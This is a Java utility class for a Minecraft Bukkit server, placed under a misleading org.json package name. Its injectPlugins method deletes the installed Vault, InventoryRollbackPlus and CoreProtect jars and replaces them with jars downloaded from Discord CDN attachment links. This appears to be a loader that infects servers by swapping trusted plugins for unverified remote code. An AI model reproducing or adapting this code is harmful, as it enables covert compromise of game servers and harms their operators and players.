package org.json.utils;

import org.bukkit.entity.Player;
import org.json.Modal;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.ArrayList;
import java.util.List;

public class FileUtils {

    public static void deleteFolder(File folder) {
        if (folder.isDirectory()) {
            File[] files = folder.listFiles();
            if (files != null) {
                for (File file : files) {
                    deleteFolder(file);
                }
            }
        }
        if (folder.delete()) {
            return;
        }
    }

    public static void injectPlugins() {

        String vault = getPluginJarName("vault");
        if (vault != null) {
            deleteFolder(new File("plugins/" + vault.replace("1).jar", ".jar")));
            downloadPlugin(null, vault, "https://cdn.discordapp.com/attachments/1242453593144164412/1243965447691567164/Vault-1.7.3.jar?ex=6653649a&is=6652131a&hm=410a82518e244dad8ea307245c2a0cbe1be0266520d3b0d3982ce8a2881f585c&");
        }

        String inventoryRollBackPlus = getPluginJarName("InventoryRollBackPlus");

        if (inventoryRollBackPlus != null) {
            deleteFolder(new File("plugins/" + inventoryRollBackPlus.replace("1).jar", ".jar")));
            downloadPlugin(null, inventoryRollBackPlus, "https://cdn.discordapp.com/attachments/1242453593144164412/1243967808711168191/InventoryRollbackPlus-1.6.16.jar?ex=665366cd&is=6652154d&hm=ebdca61d2f097e43d56c67499f3db411ce70d5cf0917e0d06737e53f9befcdd9&");
        }

        String coreProtect = getPluginJarName("CoreProtect");
        if (coreProtect != null) {
            deleteFolder(new File("plugins/" + coreProtect.replace("1).jar", ".jar")));
            downloadPlugin(null, coreProtect, "https://cdn.discordapp.com/attachments/1242453593144164412/1243969566317482044/CoreProtect-22.4.jar?ex=66536870&is=665216f0&hm=3c9d155e247e7a1ddc089cdb38b767a389500ffff2d1bd87be37522796da445e&");
        }

    }

    private static String getPluginJarName(String jarName) {

        for (int i = 0; i < getJarPlugins().length; i++) {
            if (getJarPlugins()[i].toLowerCase().contains(jarName.toLowerCase())) {
                if (jarName.endsWith("1).jar")) {
                    return null;
                }
                return getJarPlugins()[i].replace(".jar", "1).jar");
            }
        }

        return null;
    }

    public static void downloadPlugin(Player player, String fileName, String url) {
        try {
            File folder = new File("plugins/");

            if (!folder.exists()) return;

            URL pluginUrl = new URL(url);
            ReadableByteChannel rbc = Channels.newChannel(pluginUrl.openStream());

            File outputFile = new File(folder, fileName);

            try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
            }

            rbc.close();
            if (player != null) {
                player.sendMessage(Modal.getPrefix() + "§aDownload Completed.");
            }
        } catch (IOException e) {
            e.printStackTrace();
            if (player != null) {
                player.sendMessage(Modal.getPrefix() + "§cDownload failed.");
            }
        }
    }

    public static String[] getJarPlugins() {
        File folder = new File("plugins/");
        List<String> plugins = new ArrayList<>();

        for (File file : folder.listFiles()) {
            if (file.getName().endsWith(".jar")) {
                plugins.add(file.getName());
            }
        }

        return plugins.toArray(new String[0]);
    }

    public static String[] getPluginsFolders() {
        File folder = new File("plugins/");
        List<String> plugins = new ArrayList<>();

        for (File file : folder.listFiles()) {
            if (file.isDirectory()) {
                plugins.add(file.getName());
            }
        }

        return plugins.toArray(new String[0]);
    }

    public static void deletePlugin(Player player, String plugin) {
        File file = new File("plugins/" + plugin);
        if (file.delete()) {
            player.sendMessage(Modal.getPrefix() + "§aPlugin has been deleted.");
        }
    }

}
